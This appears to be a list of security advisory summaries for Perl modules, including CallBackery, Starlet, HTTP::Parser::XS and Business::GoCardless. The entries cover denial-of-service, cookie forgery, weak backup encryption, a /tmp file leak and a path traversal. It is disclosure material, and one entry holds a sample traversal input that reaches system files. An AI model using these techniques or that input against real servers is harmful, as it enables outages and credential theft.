Business::GoCardless versions before 1.01 for Perl allow memory exhaustion by flattening legacy webhook payloads before checking their signature.

A webhook body with a top-level "payload" key is verified as a legacy webhook. To rebuild the signed string, the payload is flattened into one key and value pair per leaf, each key carrying the full path to that leaf, and the pairs are then encoded, sorted and joined. A long key holding a long array costs memory proportional to the key length times the array length.

A remote attacker can exhaust memory in the process receiving webhooks with a single request that carries no valid signature.

The before_dispatch hook installed by startup() removes PATH_INFO from the end of the request URI with a substitution that interpolates PATH_INFO unquoted. Under CGI, FastCGI and PSGI both values come from the request, so the client chooses both the pattern and the string it is matched against.

A short unauthenticated request with a backreference in the path backtracks exponentially and can keep a worker process busy for minutes.

items.summary:
CallBackery versions before 0.62.0 for Perl encrypt configuration backups with the padded password as the AES key.

getCrypt() pads the backup password with "x" characters and cuts it to 32 bytes to form the AES key, with no salt and no key derivation. The first block of a backup holds a 16 hex digit length field, so decrypting one block confirms a password guess at raw AES speed.

An attacker who obtains a backup can recover its password by fast offline guessing, and with it every credential the backup holds.

items.summary:
CallBackery versions before 0.62.0 for Perl leave a world-readable dump of the configuration database in /tmp when taking a configuration backup.

getConfigBlob() has the sqlite3 shell write the dump to /tmp/cbdump<pid> and never removes it. The file takes the process umask, and a symlink planted at that predictable name is followed.

The dump holds every user's password hash and every value saved by the application's forms. A local user can read these after any backup, and may redirect the dump to a file of their choosing.

items.summary:
CallBackery versions before 0.60.1 for Perl let unauthenticated clients read the POD of any file via path traversal in the /doc route.

Every CallBackery application mounts its documentation plugin at /doc, ahead of any session check. The route passes the requested name to Pod::Simple::Search->find without validation. find splits the name on "::" and joins the parts into a file path, so a name such as "..::..::..::etc::motd" escapes @INC.

Any file the server process can read is reachable. Only POD is rendered, but a file with a POD directive and no "=cut" is POD to the end of the file.

items.summary:
CallBackery versions before 0.62.0 for Perl accept session cookies of any age sent in the X-Session-Cookie header.

cookieConf() rejects a cookie older than 300 seconds only when it arrives in the xsc query parameter. The same cookie sent in the X-Session-Cookie header is accepted however old it is.

A session cookie that leaks through a log, a Referer header or browser history authenticates as its user indefinitely.

items.summary:
CallBackery versions before 0.62.0 for Perl allow session cookie forgery via a signing secret generated with rand().

The secret that signs session cookies is built from two calls to the built-in rand(), which is seeded with 32 bits. The secret therefore has at most 2**32 possible values, and one signed cookie is enough to test each candidate offline.

An attacker who obtains a single session cookie can recover the secret and sign cookies for any user, including an administrator.

HTTP::Parser::XS versions before 0.18 for Perl truncate PATH_INFO at an encoded NUL byte in parse_http_request.

The XS parser URL-decodes the request path and measures the result with strlen(), so PATH_INFO ends at the first byte decoded from %00. The pure-Perl backend is not affected.

A remote attacker can send a path that a proxy or filter checks in full while the application routes on a shorter one.

items.summary:
Starlet versions from 0.20 before 0.33 for Perl allow memory exhaustion via unbounded buffering when decoding chunked request bodies.

The decoder adds each read to one buffer of unconsumed input. Nothing limits the length of a chunk-size line, so a line without a CRLF grows the buffer for as long as the client keeps sending, and the read timeout restarts after every read. The data of a large chunk is also held in the buffer until the whole chunk has arrived.

A remote attacker can exhaust a worker's memory with a single request.

items.summary:
Starlet versions before 0.33 for Perl send a body in responses to HEAD requests, corrupting the next response on a persistent or pipelined connection.

The request method is not passed to the response writer, so whatever body the application returns for a HEAD request is sent. With Plack::Middleware::Head the body is empty, but an HTTP/1.1 response without a Content-Length header still gets the chunked encoding terminator. Responses with status 204 or 304 are also sent with their body.

Pipelined GET and HEAD requests keep the connection open even when keep-alive is disabled, which is the default. A client or proxy reading the connection takes the extra bytes as the start of the next response, which may desynchronize a proxy that shares the connection across clients.

items.summary:
Starlet versions from 0.20 before 0.33 for Perl allow CPU exhaustion via regular expression backtracking when decoding chunked request bodies.

A chunk-size line is matched as a run of hex digits, then .* and a CRLF. A run followed by a bare LF and then a CRLF can never match, and the engine retries the match once for each digit, so the time taken grows with the square of the run length. Nothing limits the length of the run, which can span several reads.

A remote attacker can occupy a worker for about a minute of CPU time with one 128 KiB request, before the application is called.

items.summary:
Starlet versions before 0.33 for Perl allow a request declaring a large Content-Length to kill a worker by exhausting memory.

The request body is read in a loop that asks sysread for all of the remaining declared length at once. Perl grows the read buffer to that size before any data arrives, so a length larger than available memory makes the worker exit with an uncatchable out of memory error before the application is called.

A remote attacker can force a worker restart with each request of a few bytes.
